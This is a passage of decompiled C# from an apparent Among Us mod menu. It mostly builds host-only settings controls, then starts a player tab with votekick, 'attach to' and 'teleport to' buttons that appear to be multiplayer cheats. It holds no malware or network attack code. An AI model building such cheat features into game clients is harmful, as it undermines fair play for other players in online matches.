            this.s_killCooldown = currentGameOptions.GetFloat((FloatOptionNames) 1);
            this.s_vitalsCooldown = currentGameOptions.GetFloat((FloatOptionNames) 1200);
            this.s_batteryDuration = currentGameOptions.GetFloat((FloatOptionNames) 1201);
            this.s_ventCooldown = currentGameOptions.GetFloat((FloatOptionNames) 1300);
            this.s_ventDuration = currentGameOptions.GetFloat((FloatOptionNames) 1301);
            this.s_protectCooldown = currentGameOptions.GetFloat((FloatOptionNames) 1101);
            this.s_protectDuration = currentGameOptions.GetFloat((FloatOptionNames) 1100);
            this.s_shapeshiftDuration = currentGameOptions.GetFloat((FloatOptionNames) 1001);
            this.s_shapeshiftCooldown = currentGameOptions.GetFloat((FloatOptionNames) 1000);
            this.s_alertDuration = currentGameOptions.GetFloat((FloatOptionNames) 1600);
            this.s_trackerDuration = currentGameOptions.GetFloat((FloatOptionNames) 1551);
            this.s_trackerCooldown = currentGameOptions.GetFloat((FloatOptionNames) 1550);
            this.s_trackerDelay = currentGameOptions.GetFloat((FloatOptionNames) 1552);
            this.s_phantomDuration = currentGameOptions.GetFloat((FloatOptionNames) 1501);
            this.s_phantomCooldown = currentGameOptions.GetFloat((FloatOptionNames) 1500);
          }
        }
      }
      this.hostSettingsScrollPosition = GUILayout.BeginScrollView(this.hostSettingsScrollPosition, false, true, GUIStyle.none, GUI.skin.verticalScrollbar, Array.Empty<GUILayoutOption>());
      GUI.color = flag ? Color.white : new Color(0.5f, 0.5f, 0.5f, 0.7f);
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
      GUI.contentColor = ChocooPlugin.RGBMode ? ChocooPlugin.GetRGBText() : new Color(0.3f, 0.8f, 1f);
      GUILayout.Label("\uD83D\uDDFA️ Map", new GUIStyle(GUI.skin.label)
      {
        fontStyle = (FontStyle) 1
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Space(3f);
      string[] strArray = new string[6]
      {
        "The Skeld",
        "MIRA HQ",
        "Polus",
        "Reverse Skeld",
        "Airship",
        "The Fungle"
      };
      GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
      for (int index = 0; index < strArray.Length; ++index)
      {
        GUI.backgroundColor = this.selectedSettingsMapId == index ? new Color(0.3f, 0.7f, 1f, 1f) : new Color(0.3f, 0.3f, 0.3f, 1f);
        if (GUILayout.Button(strArray[index], new GUILayoutOption[1]
        {
          GUILayout.Height(25f)
        }) & flag)
        {
          this.selectedSettingsMapId = index;
          try
          {
            IGameOptions currentGameOptions = GameOptionsManager.Instance?.CurrentGameOptions;
            if (currentGameOptions != null)
            {
              byte num = index == 3 ? (byte) 0 : (byte) index;
              currentGameOptions.SetByte((ByteOptionNames) 1, num);
              this.SyncGameSettings();
            }
          }
          catch (Exception ex)
          {
            ChocooPlugin.Logger.LogError((object) ("Map error: " + ex.Message));
          }
        }
        GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
        if (index == 2)
        {
          GUILayout.EndHorizontal();
          GUILayout.Space(3f);
          GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
        }
      }
      GUILayout.EndHorizontal();
      GUILayout.EndVertical();
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.Space(8f);
      this.DrawSettingsGroupHeader("⚡ General", new Color(1f, 0.8f, 0.3f));
      this.DrawSettingsBool("Confirm Ejects", ref this.s_confirmEjects, (BoolOptionNames) 3);
      this.DrawSettingsBool("Anonymous Votes", ref this.s_anonVotes, (BoolOptionNames) 4);
      this.DrawSettingsBool("Visual Tasks", ref this.s_visualTasks, (BoolOptionNames) 1);
      GUILayout.Space(4f);
      this.DrawSettingsInt("Emergency Meetings", ref this.s_emergencyMeetings, 0.0f, 9f, (Int32OptionNames) 3);
      this.DrawSettingsInt("Emergency Cooldown", ref this.s_emergencyCooldown, 0.0f, 60f, (Int32OptionNames) 4);
      this.DrawSettingsInt("Discussion Time", ref this.s_discussionTime, 0.0f, 120f, (Int32OptionNames) 5);
      this.DrawSettingsInt("Voting Time", ref this.s_votingTime, 0.0f, 300f, (Int32OptionNames) 6);
      this.DrawSettingsInt("Kill Distance", ref this.s_killDistance, 0.0f, 2f, (Int32OptionNames) 2);
      this.DrawSettingsInt("Task Bar Mode", ref this.s_taskBarMode, 0.0f, 2f, (Int32OptionNames) 13);
      this.DrawSettingsInt("# Common Tasks", ref this.s_commonTasks, 0.0f, 2f, (Int32OptionNames) 10);
      this.DrawSettingsInt("# Short Tasks", ref this.s_shortTasks, 0.0f, 5f, (Int32OptionNames) 11);
      this.DrawSettingsInt("# Long Tasks", ref this.s_longTasks, 0.0f, 3f, (Int32OptionNames) 12);
      GUILayout.Space(4f);
      this.DrawSettingsFloat("Player Speed", ref this.s_playerSpeed, 0.5f, 3f, (FloatOptionNames) 2);
      this.DrawSettingsFloat("Crewmate Vision", ref this.s_crewVision, 0.25f, 5f, (FloatOptionNames) 4);
      this.DrawSettingsFloat("Impostor Vision", ref this.s_impVision, 0.25f, 5f, (FloatOptionNames) 3);
      this.DrawSettingsFloat("Kill Cooldown", ref this.s_killCooldown, 10f, 60f, (FloatOptionNames) 1);
      GUILayout.EndVertical();
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.Space(8f);
      this.DrawSettingsGroupHeader("\uD83D\uDD2C Scientist", new Color(0.3f, 0.8f, 1f));
      this.DrawSettingsFloat("Vitals Display Cooldown", ref this.s_vitalsCooldown, 0.0f, 60f, (FloatOptionNames) 1200);
      this.DrawSettingsFloat("Battery Duration", ref this.s_batteryDuration, 1f, 30f, (FloatOptionNames) 1201);
      GUILayout.EndVertical();
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.Space(8f);
      this.DrawSettingsGroupHeader("\uD83D\uDD27 Engineer", new Color(1f, 0.6f, 0.2f));
      this.DrawSettingsFloat("Vent Use Cooldown", ref this.s_ventCooldown, 0.0f, 60f, (FloatOptionNames) 1300);
      this.DrawSettingsFloat("Max Time in Vents", ref this.s_ventDuration, 0.0f, 60f, (FloatOptionNames) 1301);
      GUILayout.EndVertical();
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.Space(8f);
      this.DrawSettingsGroupHeader("\uD83D\uDC7C Guardian Angel", new Color(1f, 1f, 0.5f));
      this.DrawSettingsFloat("Protect Cooldown", ref this.s_protectCooldown, 0.0f, 60f, (FloatOptionNames) 1101);
      this.DrawSettingsFloat("Protection Duration", ref this.s_protectDuration, 0.0f, 30f, (FloatOptionNames) 1100);
      this.DrawSettingsBool("Protect Visible to Impostors", ref this.s_protectVisible, (BoolOptionNames) 1100);
      GUILayout.EndVertical();
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.Space(8f);
      this.DrawSettingsGroupHeader("\uD83C\uDFAD Shapeshifter", new Color(0.5f, 0.3f, 0.9f));
      this.DrawSettingsFloat("Shapeshift Duration", ref this.s_shapeshiftDuration, 1f, 30f, (FloatOptionNames) 1001);
      this.DrawSettingsFloat("Shapeshift Cooldown", ref this.s_shapeshiftCooldown, 0.0f, 60f, (FloatOptionNames) 1000);
      this.DrawSettingsBool("Leave Shapeshifting Evidence", ref this.s_shapeshiftEvidence, (BoolOptionNames) 1000);
      GUILayout.EndVertical();
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.Space(8f);
      this.DrawSettingsGroupHeader("\uD83D\uDD14 Noisemaker", new Color(1f, 0.4f, 0.6f));
      this.DrawSettingsFloat("Alert Duration", ref this.s_alertDuration, 0.5f, 30f, (FloatOptionNames) 1600);
      GUILayout.EndVertical();
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.Space(8f);
      this.DrawSettingsGroupHeader("\uD83D\uDD0D Tracker", new Color(0.3f, 1f, 0.5f));
      this.DrawSettingsFloat("Tracker Duration", ref this.s_trackerDuration, 1f, 30f, (FloatOptionNames) 1551);
      this.DrawSettingsFloat("Tracker Cooldown", ref this.s_trackerCooldown, 0.0f, 60f, (FloatOptionNames) 1550);
      this.DrawSettingsFloat("Tracker Delay", ref this.s_trackerDelay, 0.0f, 10f, (FloatOptionNames) 1552);
      GUILayout.EndVertical();
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.Space(8f);
      this.DrawSettingsGroupHeader("\uD83D\uDC7B Phantom", new Color(0.6f, 0.6f, 0.6f));
      this.DrawSettingsFloat("Phantom Duration", ref this.s_phantomDuration, 0.0f, 30f, (FloatOptionNames) 1501);
      this.DrawSettingsFloat("Phantom Cooldown", ref this.s_phantomCooldown, 0.0f, 60f, (FloatOptionNames) 1500);
      GUILayout.EndVertical();
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.Space(8f);
      GUI.color = Color.white;
      GUILayout.EndScrollView();
    }

    private void DrawSettingsGroupHeader(string title, Color color)
    {
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
      GUI.contentColor = ChocooPlugin.RGBMode ? ChocooPlugin.GetRGBText() : color;
      GUILayout.Label(title, new GUIStyle(GUI.skin.label)
      {
        fontStyle = (FontStyle) 1
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Space(3f);
    }

    private void DrawSettingsBool(string label, ref bool value, BoolOptionNames option)
    {
      bool flag1 = Object.op_Inequality((Object) AmongUsClient.Instance, (Object) null) && ((InnerNetClient) AmongUsClient.Instance).AmHost;
      if (!this.toggleAnimationStates.ContainsKey(label))
        this.toggleAnimationStates[label] = value ? 1f : 0.0f;
      float num1 = value ? 1f : 0.0f;
      this.toggleAnimationStates[label] = !ChocooPlugin.DisableAnimations ? Mathf.Lerp(this.toggleAnimationStates[label], num1, Time.deltaTime * 8f) : num1;
      GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Label(label, new GUILayoutOption[1]
      {
        GUILayout.Width(170f)
      });
      GUILayout.FlexibleSpace();
      float num2 = 45f;
      float num3 = 22f;
      Rect rect = GUILayoutUtility.GetRect(num2, num3);
      bool flag2 = ((Rect) ref rect).Contains(Event.current.mousePosition);
      Color color1;
      // ISSUE: explicit constructor call
      ((Color) ref color1).\u002Ector(0.25f, 0.25f, 0.25f, 1f);
      Color color2;
      // ISSUE: explicit constructor call
      ((Color) ref color2).\u002Ector(0.5f, 0.2f, 0.9f, 1f);
      Color col1 = Color.Lerp(color1, color2, this.toggleAnimationStates[label]);
      if (flag2)
        col1 = Color.Lerp(col1, Color.white, 0.3f);
      GUIStyle guiStyle1 = new GUIStyle(GUI.skin.box);
      guiStyle1.normal.background = this.MakeTex(2, 2, col1);
      GUI.backgroundColor = col1;
      GUI.Box(rect, "", guiStyle1);
      if (GUI.Button(rect, "", GUIStyle.none) & flag1)
      {
        value = !value;
        try
        {
          GameOptionsManager.Instance?.CurrentGameOptions?.SetBool(option, value);
          this.SyncGameSettings();
        }
        catch (Exception ex)
        {
          ChocooPlugin.Logger.LogError((object) ("SetBool error: " + ex.Message));
        }
      }
      float num4 = num3 - 4f;
      float num5 = Mathf.Lerp(((Rect) ref rect).x + 2f, (float) ((double) ((Rect) ref rect).x + (double) num2 - (double) num4 - 2.0), this.toggleAnimationStates[label]);
      Color col2 = flag2 ? new Color(1f, 1f, 1f, 1f) : Color.white;
      GUIStyle guiStyle2 = new GUIStyle(GUI.skin.box);
      guiStyle2.normal.background = this.MakeTex(2, 2, col2);
      GUI.backgroundColor = col2;
      GUI.Box(new Rect(num5, ((Rect) ref rect).y + 2f, num4, num4), "", guiStyle2);
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.EndHorizontal();
      GUILayout.Space(4f);
    }

    private void DrawSettingsInt(
      string label,
      ref float value,
      float min,
      float max,
      Int32OptionNames option)
    {
      bool flag1 = Object.op_Inequality((Object) AmongUsClient.Instance, (Object) null) && ((InnerNetClient) AmongUsClient.Instance).AmHost;
      bool flag2 = this.focusedSettingKey == label;
      GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.backgroundColor = new Color(0.2f, 0.2f, 0.2f, 1f);
      Rect rect1 = GUILayoutUtility.GetRect(GUIContent.none, GUI.skin.box, new GUILayoutOption[2]
      {
        GUILayout.Height(24f),
        GUILayout.Width(90f)
      });
      GUI.Box(rect1, "", GUI.skin.box);
      if (GUI.Button(rect1, "", GUIStyle.none) & flag1)
      {
        if (!string.IsNullOrEmpty(this.focusedSettingKey) && this.focusedSettingKey != label)
          this.ApplySettingInput(this.focusedSettingKey, this.settingInputBuffer);
        this.focusedSettingKey = label;
        this.settingsBoxFocused = true;
        this.settingInputBuffer = ((int) value).ToString();
        this.settingCursorVisible = true;
        this.settingCursorBlink = 0.0f;
      }
      Rect rect2;
      // ISSUE: explicit constructor call
      ((Rect) ref rect2).\u002Ector(((Rect) ref rect1).x + 4f, ((Rect) ref rect1).y + 4f, ((Rect) ref rect1).width - 8f, ((Rect) ref rect1).height - 8f);
      GUIStyle guiStyle = flag2 ? this._styleSettingsFocused : this._styleSettingsNormal;
      string str = flag2 ? (this.settingCursorVisible ? this.settingInputBuffer + "|" : this.settingInputBuffer) : ((int) value).ToString();
      GUI.Label(rect2, str, guiStyle);
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.Space(4f);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Label(label, new GUIStyle(GUI.skin.label)
      {
        fontSize = 10
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.FlexibleSpace();
      GUI.backgroundColor = new Color(0.6f, 0.2f, 0.2f, 1f);
      if (GUILayout.Button("-", new GUILayoutOption[2]
      {
        GUILayout.Width(22f),
        GUILayout.Height(22f)
      }) & flag1)
      {
        --value;
        this.ApplyIntOption(option, (int) value);
      }
      GUI.backgroundColor = new Color(0.2f, 0.6f, 0.2f, 1f);
      if (GUILayout.Button("+", new GUILayoutOption[2]
      {
        GUILayout.Width(22f),
        GUILayout.Height(22f)
      }) & flag1)
      {
        ++value;
        this.ApplyIntOption(option, (int) value);
      }
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.EndHorizontal();
      GUILayout.Space(4f);
    }

    private void DrawSettingsFloat(
      string label,
      ref float value,
      float min,
      float max,
      FloatOptionNames option)
    {
      bool flag1 = Object.op_Inequality((Object) AmongUsClient.Instance, (Object) null) && ((InnerNetClient) AmongUsClient.Instance).AmHost;
      bool flag2 = this.focusedSettingKey == label;
      float num = (double) max - (double) min > 10.0 ? 0.5f : 0.25f;
      GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.backgroundColor = new Color(0.2f, 0.2f, 0.2f, 1f);
      Rect rect1 = GUILayoutUtility.GetRect(GUIContent.none, GUI.skin.box, new GUILayoutOption[2]
      {
        GUILayout.Height(24f),
        GUILayout.Width(90f)
      });
      GUI.Box(rect1, "", GUI.skin.box);
      if (GUI.Button(rect1, "", GUIStyle.none) & flag1)
      {
        if (!string.IsNullOrEmpty(this.focusedSettingKey) && this.focusedSettingKey != label)
          this.ApplySettingInput(this.focusedSettingKey, this.settingInputBuffer);
        this.focusedSettingKey = label;
        this.settingsBoxFocused = true;
        this.settingInputBuffer = value.ToString("F2");
        this.settingCursorVisible = true;
        this.settingCursorBlink = 0.0f;
      }
      Rect rect2;
      // ISSUE: explicit constructor call
      ((Rect) ref rect2).\u002Ector(((Rect) ref rect1).x + 4f, ((Rect) ref rect1).y + 4f, ((Rect) ref rect1).width - 8f, ((Rect) ref rect1).height - 8f);
      GUIStyle guiStyle = flag2 ? this._styleSettingsFocused : this._styleSettingsNormal;
      string str = flag2 ? (this.settingCursorVisible ? this.settingInputBuffer + "|" : this.settingInputBuffer) : value.ToString("F2");
      GUI.Label(rect2, str, guiStyle);
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.Space(4f);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Label(label, new GUIStyle(GUI.skin.label)
      {
        fontSize = 10
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.FlexibleSpace();
      GUI.backgroundColor = new Color(0.6f, 0.2f, 0.2f, 1f);
      if (GUILayout.Button("-", new GUILayoutOption[2]
      {
        GUILayout.Width(22f),
        GUILayout.Height(22f)
      }) & flag1)
      {
        value = (float) Math.Round((double) value - (double) num, 2);
        this.ApplyFloatOption(option, value);
      }
      GUI.backgroundColor = new Color(0.2f, 0.6f, 0.2f, 1f);
      if (GUILayout.Button("+", new GUILayoutOption[2]
      {
        GUILayout.Width(22f),
        GUILayout.Height(22f)
      }) & flag1)
      {
        value = (float) Math.Round((double) value + (double) num, 2);
        this.ApplyFloatOption(option, value);
      }
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.EndHorizontal();
      GUILayout.Space(4f);
    }

    private void ApplySettingInput(string key, string buffer)
    {
      if (string.IsNullOrWhiteSpace(buffer))
        return;
      float result;
      if (!float.TryParse(buffer, out result))
        return;
      try
      {
        string s = key;
        // ISSUE: reference to a compiler-generated method
        switch (\u003CPrivateImplementationDetails\u003E.ComputeStringHash(s))
        {
          case 256644636:
            if (!(s == "Task Bar Mode"))
              break;
            this.s_taskBarMode = result;
            this.ApplyIntOption((Int32OptionNames) 13, (int) result);
            break;
          case 381151393:
            if (!(s == "Tracker Duration"))
              break;
            this.s_trackerDuration = result;
            this.ApplyFloatOption((FloatOptionNames) 1551, result);
            break;
          case 467257133:
            if (!(s == "# Common Tasks"))
              break;
            this.s_commonTasks = result;
            this.ApplyIntOption((Int32OptionNames) 10, (int) result);
            break;
          case 528437283:
            if (!(s == "Shapeshift Cooldown"))
              break;
            this.s_shapeshiftCooldown = result;
            this.ApplyFloatOption((FloatOptionNames) 1000, result);
            break;
          case 568237726:
            if (!(s == "Kill Cooldown"))
              break;
            this.s_killCooldown = result;
            this.ApplyFloatOption((FloatOptionNames) 1, result);
            break;
          case 612090288:
            if (!(s == "Emergency Meetings"))
              break;
            this.s_emergencyMeetings = result;
            this.ApplyIntOption((Int32OptionNames) 3, (int) result);
            break;
          case 998922042:
            if (!(s == "Discussion Time"))
              break;
            this.s_discussionTime = result;
            this.ApplyIntOption((Int32OptionNames) 5, (int) result);
            break;
          case 1551499986:
            if (!(s == "# Long Tasks"))
              break;
            this.s_longTasks = result;
            this.ApplyIntOption((Int32OptionNames) 12, (int) result);
            break;
          case 1690602399:
            if (!(s == "Alert Duration"))
              break;
            this.s_alertDuration = result;
            this.ApplyFloatOption((FloatOptionNames) 1600, result);
            break;
          case 1693244362:
            if (!(s == "Phantom Duration"))
              break;
            this.s_phantomDuration = result;
            this.ApplyFloatOption((FloatOptionNames) 1501, result);
            break;
          case 2011133385:
            if (!(s == "Vitals Display Cooldown"))
              break;
            this.s_vitalsCooldown = result;
            this.ApplyFloatOption((FloatOptionNames) 1200, result);
            break;
          case 2392924606:
            if (!(s == "Shapeshift Duration"))
              break;
            this.s_shapeshiftDuration = result;
            this.ApplyFloatOption((FloatOptionNames) 1001, result);
            break;
          case 2459083587:
            if (!(s == "Crewmate Vision"))
              break;
            this.s_crewVision = result;
            this.ApplyFloatOption((FloatOptionNames) 4, result);
            break;
          case 2473026420:
            if (!(s == "Impostor Vision"))
              break;
            this.s_impVision = result;
            this.ApplyFloatOption((FloatOptionNames) 3, result);
            break;
          case 2591742836:
            if (!(s == "Kill Distance"))
              break;
            this.s_killDistance = result;
            this.ApplyIntOption((Int32OptionNames) 2, (int) result);
            break;
          case 2689404054:
            if (!(s == "Battery Duration"))
              break;
            this.s_batteryDuration = result;
            this.ApplyFloatOption((FloatOptionNames) 1201, result);
            break;
          case 2776912636:
            if (!(s == "Tracker Cooldown"))
              break;
            this.s_trackerCooldown = result;
            this.ApplyFloatOption((FloatOptionNames) 1550, result);
            break;
          case 2910279947:
            if (!(s == "Voting Time"))
              break;
            this.s_votingTime = result;
            this.ApplyIntOption((Int32OptionNames) 6, (int) result);
            break;
          case 2915651535:
            if (!(s == "Phantom Cooldown"))
              break;
            this.s_phantomCooldown = result;
            this.ApplyFloatOption((FloatOptionNames) 1500, result);
            break;
          case 2919009890:
            if (!(s == "Protection Duration"))
              break;
            this.s_protectDuration = result;
            this.ApplyFloatOption((FloatOptionNames) 1100, result);
            break;
          case 3051115085:
            if (!(s == "Protect Cooldown"))
              break;
            this.s_protectCooldown = result;
            this.ApplyFloatOption((FloatOptionNames) 1101, result);
            break;
          case 3062221931:
            if (!(s == "Player Speed"))
              break;
            this.s_playerSpeed = result;
            this.ApplyFloatOption((FloatOptionNames) 2, result);
            break;
          case 3184318511:
            if (!(s == "Emergency Cooldown"))
              break;
            this.s_emergencyCooldown = result;
            this.ApplyIntOption((Int32OptionNames) 4, (int) result);
            break;
          case 3473002466:
            if (!(s == "Vent Use Cooldown"))
              break;
            this.s_ventCooldown = result;
            this.ApplyFloatOption((FloatOptionNames) 1300, result);
            break;
          case 3548980197:
            if (!(s == "Max Time in Vents"))
              break;
            this.s_ventDuration = result;
            this.ApplyFloatOption((FloatOptionNames) 1301, result);
            break;
          case 4029529074:
            if (!(s == "# Short Tasks"))
              break;
            this.s_shortTasks = result;
            this.ApplyIntOption((Int32OptionNames) 11, (int) result);
            break;
          case 4063416484:
            if (!(s == "Tracker Delay"))
              break;
            this.s_trackerDelay = result;
            this.ApplyFloatOption((FloatOptionNames) 1552, result);
            break;
        }
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) $"ApplySettingInput error for [{key}]: {ex.Message}");
      }
    }

    private void ApplyIntOption(Int32OptionNames option, int value)
    {
      try
      {
        GameOptionsManager.Instance?.CurrentGameOptions?.SetInt(option, value);
        this.SyncGameSettings();
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("ApplyIntOption error: " + ex.Message));
      }
    }

    private void ApplyFloatOption(FloatOptionNames option, float value)
    {
      try
      {
        GameOptionsManager.Instance?.CurrentGameOptions?.SetFloat(option, value);
        this.SyncGameSettings();
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("ApplyFloatOption error: " + ex.Message));
      }
    }

    private void SyncGameSettings()
    {
      try
      {
        if (Object.op_Equality((Object) AmongUsClient.Instance, (Object) null) || !((InnerNetClient) AmongUsClient.Instance).AmHost || !Object.op_Inequality((Object) GameManager.Instance, (Object) null))
          return;
        GameManager.Instance.LogicOptions?.SyncOptions();
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("SyncGameSettings error: " + ex.Message));
      }
    }

    private void LoadSettingsFromGame()
    {
      try
      {
        IGameOptions currentGameOptions = GameOptionsManager.Instance?.CurrentGameOptions;
        if (currentGameOptions == null)
          return;
        this.s_confirmEjects = currentGameOptions.GetBool((BoolOptionNames) 3);
        this.s_anonVotes = currentGameOptions.GetBool((BoolOptionNames) 4);
        this.s_visualTasks = currentGameOptions.GetBool((BoolOptionNames) 1);
        this.s_protectVisible = currentGameOptions.GetBool((BoolOptionNames) 1100);
        this.s_shapeshiftEvidence = currentGameOptions.GetBool((BoolOptionNames) 1000);
        this.s_emergencyMeetings = (float) currentGameOptions.GetInt((Int32OptionNames) 3);
        this.s_emergencyCooldown = (float) currentGameOptions.GetInt((Int32OptionNames) 4);
        this.s_discussionTime = (float) currentGameOptions.GetInt((Int32OptionNames) 5);
        this.s_votingTime = (float) currentGameOptions.GetInt((Int32OptionNames) 6);
        this.s_killDistance = (float) currentGameOptions.GetInt((Int32OptionNames) 2);
        this.s_taskBarMode = (float) currentGameOptions.GetInt((Int32OptionNames) 13);
        this.s_commonTasks = (float) currentGameOptions.GetInt((Int32OptionNames) 10);
        this.s_shortTasks = (float) currentGameOptions.GetInt((Int32OptionNames) 11);
        this.s_longTasks = (float) currentGameOptions.GetInt((Int32OptionNames) 12);
        this.s_playerSpeed = currentGameOptions.GetFloat((FloatOptionNames) 2);
        this.s_crewVision = currentGameOptions.GetFloat((FloatOptionNames) 4);
        this.s_impVision = currentGameOptions.GetFloat((FloatOptionNames) 3);
        this.s_killCooldown = currentGameOptions.GetFloat((FloatOptionNames) 1);
        this.s_vitalsCooldown = currentGameOptions.GetFloat((FloatOptionNames) 1200);
        this.s_batteryDuration = currentGameOptions.GetFloat((FloatOptionNames) 1201);
        this.s_ventCooldown = currentGameOptions.GetFloat((FloatOptionNames) 1300);
        this.s_ventDuration = currentGameOptions.GetFloat((FloatOptionNames) 1301);
        this.s_protectCooldown = currentGameOptions.GetFloat((FloatOptionNames) 1101);
        this.s_protectDuration = currentGameOptions.GetFloat((FloatOptionNames) 1100);
        this.s_shapeshiftDuration = currentGameOptions.GetFloat((FloatOptionNames) 1001);
        this.s_shapeshiftCooldown = currentGameOptions.GetFloat((FloatOptionNames) 1000);
        this.s_alertDuration = currentGameOptions.GetFloat((FloatOptionNames) 1600);
        this.s_trackerDuration = currentGameOptions.GetFloat((FloatOptionNames) 1551);
        this.s_trackerCooldown = currentGameOptions.GetFloat((FloatOptionNames) 1550);
        this.s_trackerDelay = currentGameOptions.GetFloat((FloatOptionNames) 1552);
        this.s_phantomDuration = currentGameOptions.GetFloat((FloatOptionNames) 1501);
        this.s_phantomCooldown = currentGameOptions.GetFloat((FloatOptionNames) 1500);
        this.selectedSettingsMapId = (int) currentGameOptions.GetByte((ByteOptionNames) 1);
        ChocooPlugin.Logger.LogInfo((object) "[Settings] Loaded from game successfully");
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("LoadSettingsFromGame error: " + ex.Message));
      }
    }

    private void DrawVotekickTab()
    {
      GUI.contentColor = ChocooPlugin.RGBMode ? ChocooPlugin.GetRGBText() : new Color(0.5f, 0.8f, 1f);
      GUILayout.Label("Players & Votekick", new GUIStyle(GUI.skin.label)
      {
        fontSize = 14,
        fontStyle = (FontStyle) 1
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Space(10f);
      GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.backgroundColor = this.activePlayersSection == "Players" ? new Color(0.3f, 0.7f, 1f, 1f) : new Color(0.3f, 0.3f, 0.3f, 1f);
      if (GUILayout.Button("\uD83D\uDC65 PLAYERS", new GUILayoutOption[1]
      {
        GUILayout.Height(40f)
      }))
        this.activePlayersSection = "Players";
      GUILayout.Space(10f);
      GUI.backgroundColor = this.activePlayersSection == "Votekick" ? new Color(1f, 0.6f, 0.2f, 1f) : new Color(0.3f, 0.3f, 0.3f, 1f);
      if (GUILayout.Button("⚠️ VOTEKICK", new GUILayoutOption[1]
      {
        GUILayout.Height(40f)
      }))
        this.activePlayersSection = "Votekick";
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.EndHorizontal();
      GUILayout.Space(15f);
      if (this.activePlayersSection == "Players")
        this.DrawPlayersSection();
      else
        this.DrawVotekickSection();
    }

    private void DrawPlayersSection()
    {
      this.playersSectionScrollPosition = GUILayout.BeginScrollView(this.playersSectionScrollPosition, false, true, GUIStyle.none, GUI.skin.verticalScrollbar, GUIStyle.none, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.Space(5f);
      GUI.contentColor = Color.yellow;
      GUILayout.Label("Select Player", new GUIStyle(GUI.skin.label)
      {
        fontStyle = (FontStyle) 1
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Space(5f);
      this.votekickScrollPosition = GUILayout.BeginScrollView(this.votekickScrollPosition, new GUILayoutOption[1]
      {
        GUILayout.Height(220f)
      });
      foreach (PlayerControl playerControl in PlayerControl.AllPlayerControls.ToArray())
      {
        if (Object.op_Inequality((Object) playerControl, (Object) null) && Object.op_Inequality((Object) playerControl.Data, (Object) null))
        {
          string str = this.StripHtmlTags(playerControl.Data.PlayerName);
          GUI.backgroundColor = ChocooPlugin.selectedVotekickTargetId == playerControl.Data.ClientId ? Color.cyan : new Color(0.3f, 0.3f, 0.3f, 1f);
          if (GUILayout.Button(str, new GUILayoutOption[1]
          {
            GUILayout.Height(25f)
          }))
            ChocooPlugin.selectedVotekickTargetId = playerControl.Data.ClientId;
          GUI.backgroundColor = ChocooPlugin.GetRGBColor();
        }
      }
      GUILayout.EndScrollView();
      GUILayout.Space(10f);
      GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.enabled = ChocooPlugin.selectedVotekickTargetId != -1;
      if (this.isAttachedToPlayer && this.attachedPlayerId == ChocooPlugin.selectedVotekickTargetId)
      {
        GUI.backgroundColor = new Color(1f, 0.3f, 0.3f, 1f);
        if (GUILayout.Button("STOP ATTACHING", new GUILayoutOption[1]
        {
          GUILayout.Height(35f)
        }))
        {
          this.isAttachedToPlayer = false;
          this.attachedPlayerId = -1;
        }
      }
      else
      {
        GUI.backgroundColor = ChocooPlugin.GetRGBColor();
        if (GUILayout.Button("ATTACH TO", new GUILayoutOption[1]
        {
          GUILayout.Height(35f)
        }))
        {
          this.isAttachedToPlayer = true;
          this.attachedPlayerId = ChocooPlugin.selectedVotekickTargetId;
          this.attachUpdateTimer = 0.0f;
        }
      }
      GUILayout.Space(5f);
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      if (GUILayout.Button("TP TO", new GUILayoutOption[1]
      {
        GUILayout.Height(35f)
      }))
